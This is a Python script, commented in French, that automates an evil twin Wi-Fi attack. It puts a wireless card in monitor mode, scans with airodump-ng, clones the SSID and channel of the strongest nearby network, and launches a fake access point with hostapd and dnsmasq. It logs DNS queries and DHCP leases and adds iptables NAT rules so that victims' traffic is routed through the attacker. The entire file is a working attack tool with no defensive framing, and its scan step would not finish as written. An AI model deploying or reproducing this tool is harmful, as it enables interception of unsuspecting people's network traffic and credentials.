import os
import subprocess
import logging

logging.basicConfig(filename='fake_ap_setup.log', level=logging.DEBUG, format='%(asctime)s %(message)s')

def run_command(command):
    try:
        logging.info(f"Running command: {command}")
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        logging.info(output.decode())
        print(f"Command executed successfully: {command}")
    except subprocess.CalledProcessError as e:
        logging.error(f"Command failed: {e.output.decode()}")
        print(f"Command failed: {command}\nError: {e.output.decode()}")

def setup():
    print("Starting setup...")

    # ON check que tout le nécessaire est installé
    run_command("apt-get update")
    run_command("apt-get install -y hostapd dnsmasq apache2 aircrack-ng")

    # on passe en monitor mode
    run_command("airmon-ng check kill")
    run_command("airmon-ng start wlan1")

    # Création d'un dossier dédié 
    run_command("mkdir -p /root/fap")
    os.chdir("/root/fap")

    print("Setup completed.")

def find_most_powerful_network():
    print("Scanning for networks...")
    run_command("airodump-ng wlan1mon --output-format csv --write /root/fap/scan")

    # oin lit le fichier CSV généré par airodump-ng
    with open("/root/fap/scan-01.csv", 'r') as f:
        lines = f.readlines()

    #skip de l'en-tête
    lines = lines[1:]

    # Ici on extrait le réseau avec la puissance la plus élevée
    most_powerful_network = max(lines, key=lambda line: int(line.split(',')[8]))

    # Enfin de cet élément on extrait le ssid et le channel, qui sera plus tard exploité pour générer le fake access point
    ssid = most_powerful_network.split(',')[13]
    channel = most_powerful_network.split(',')[3]

    return ssid, channel

def setup_fake_ap(ssid, channel):
    print(f"Setting up fake AP with SSID: {ssid} and channel: {channel}")

    # on  écrit les fichiers de conf pour hostapd et dnsmasq
    with open("/root/fap/hostapd.conf", 'w') as f:
        f.write(f"""
interface=wlan1mon
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
""")
    logging.info("hostapd.conf created")
    print("hostapd configuration has been created.")

    run_command("hostapd /root/fap/hostapd.conf &")

    with open("/root/fap/dnsmasq.conf", 'w') as f:
        f.write("""
interface=wlan1mon
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
""")
    logging.info("dnsmasq.conf created")
    print("dnsmasq configuration has been created.")

    run_command("ifconfig wlan1mon up 192.168.1.1 netmask 255.255.255.0")
    run_command("route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1")

    run_command("dnsmasq -C /root/fap/dnsmasq.conf -d &")

    run_command("iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE")
    run_command("iptables --append FORWARD --in-interface wlan1mon -j ACCEPT")
    run_command("echo 1 > /proc/sys/net/ipv4/ip_forward")

    print("Fake AP paramétré, checker les logs pour plus de détails")

if __name__ == "__main__":
    setup()
    ssid, channel = find_most_powerful_network()
    setup_fake_ap(ssid, channel)